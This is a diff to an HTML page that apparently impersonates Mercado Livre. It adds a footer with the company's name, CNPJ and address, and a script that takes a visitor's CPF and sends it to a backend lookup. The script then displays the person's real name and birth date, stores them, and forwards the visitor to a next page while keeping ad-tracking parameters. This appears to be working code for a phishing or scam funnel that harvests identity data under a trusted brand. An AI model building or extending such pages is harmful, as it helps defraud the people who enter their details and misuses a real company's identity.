@@ -411,12 +411,118 @@
   Consultar
 </a>
 
+<footer>
+        <p class="footer-company">Mercado Livre</p>
+        <p>CNPJ: 23.862.762/0001-00</p>
+        <p>Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP</p>
+        <p>© 2025 - Todos os direitos reservados</p>
+    </footer>
+
+    <script>
+        // Função para obter todos os parâmetros da URL atual (incluindo UTMs)
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL preservando parâmetros UTM
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            // Adiciona TODOS os parâmetros originais da URL atual (incluindo UTMs)
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        document.getElementById('cpf').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length <= 11) {
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                e.target.value = value;
+            }
+        });
+
+        async function consultarCPF(cpf) {
+            const cpfLimpo = cpf.replace(/[^\d]/g, '');
+
+            if (cpfLimpo.length !== 11) {
+                throw new Error('CPF inválido: deve conter 11 dígitos');
+            }
+
+            const response = await fetch('/api/consulta_cpf.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `cpf=${cpfLimpo}`
+            });
+
+            const data = await response.json();
+
+            if (!data.success) {
+                throw new Error(data.error || 'CPF não encontrado');
+            }
+
+            return {
+                nome: data.data.nome || 'Nome não disponível',
+                data_nascimento: data.data.nascimento || 'Data não disponível'
+            };
+        }
+
+        document.getElementById('continuar-btn').addEventListener('click', async function () {
+            const cpf = document.getElementById('cpf').value;
+
+            if (cpf.length < 14) {
+                alert('Por favor, preencha um CPF válido.');
+                return;
+            }
+
+            document.getElementById('form-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+
+            try {
+                const userData = await consultarCPF(cpf);
+                sessionStorage.setItem('Mercado Librebank_user_data', JSON.stringify({
+    cpf: cpf.replace(/\D/g, ''),
+    nome: userData.nome,
+    nascimento: userData.data_nascimento
+}));
+
+                if (userData && userData.nome) {
+                    document.getElementById('loading-screen').classList.add('hidden');
+                    document.getElementById('success-screen').classList.remove('hidden');
+
+                    document.getElementById('user-name').textContent = userData.nome;
+                    document.getElementById('user-birth').textContent = userData.data_nascimento;
+                } else {
+                    document.getElementById('loading-screen').classList.add('hidden');
+                    document.getElementById('form-screen').classList.remove('hidden');
+                    alert('CPF não encontrado. Tente novamente.');
+                }
+            } catch (error) {
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('form-screen').classList.remove('hidden');
+                alert(`Erro: ${error.message}`);
+            }
+        });
+
+        document.getElementById('continuar-final').addEventListener('click', function () {
+            window.location.href = buildUrlWithParams('2.html');
+        });
+    </script>
+
+
 </body>
 </html>
-
-<div class="form-section">
-                <div class="form-group">
-                    <label class="form-label" for="cpf">CPF</label>
-                    <input type="text" id="cpf" class="form-input" placeholder="000.000.000-00" maxlength="14">
-                </div>
-        
